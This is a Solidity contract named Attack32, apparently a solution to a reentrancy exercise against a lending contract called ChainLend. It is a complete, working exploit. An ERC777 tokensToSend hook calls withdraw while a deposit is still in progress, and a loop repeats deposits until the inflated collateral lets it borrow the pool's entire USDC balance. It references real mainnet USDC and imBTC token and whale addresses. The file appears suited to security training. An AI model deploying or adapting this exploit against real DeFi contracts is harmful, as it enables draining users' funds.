// SPDX-License-Identifier: GPL-3.0-or-later 
pragma solidity ^0.8.13;


import "../reentrancy-3/ChainLend.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
contract Attack32  {

    ChainLend public chainlad;
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    address public USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address public USDC_WHALE = address(0xF977814e90dA44bFA03b6295A0616a897441aceC);
    address public imBTC = address(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    address public imBTC_WHALE = address(0xFEa4224Da399F672eB21a9F3F7324cEF1d7a965C);
    IERC20 public usdc;
    IERC20 public imbtc;
    
    constructor(address _chainlad) payable {
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));

        chainlad = ChainLend(_chainlad);

        usdc = IERC20(USDC);
        imbtc = IERC20(imBTC);
  }

    uint256 borrowLimit;
    uint256 public imbtcBal;

    function attack() public {

        while(true){
            imbtcBal = imbtc.balanceOf(address(this));
            borrowLimit = (chainlad.deposits(address(this)) * 20_000 * 1e6) / 1e8;
            borrowLimit =  ((borrowLimit * 80) / 100);

            if (borrowLimit >= usdc.balanceOf(address(chainlad))){
                chainlad.borrow(usdc.balanceOf(address(chainlad)));
                break;
            }

            imbtc.approve(address(chainlad), imbtcBal);
            chainlad.deposit(imbtcBal);

            chainlad.deposit(0);
        }
    }

    uint public numToSend;
    function tokensToSend(
        address, 
        address, 
        address, 
        uint, 
        bytes calldata, 
        bytes calldata
        ) public {

        numToSend++;

         if (numToSend  % 2 == 0){
            chainlad.withdraw(imbtcBal);
        } 
    }
}
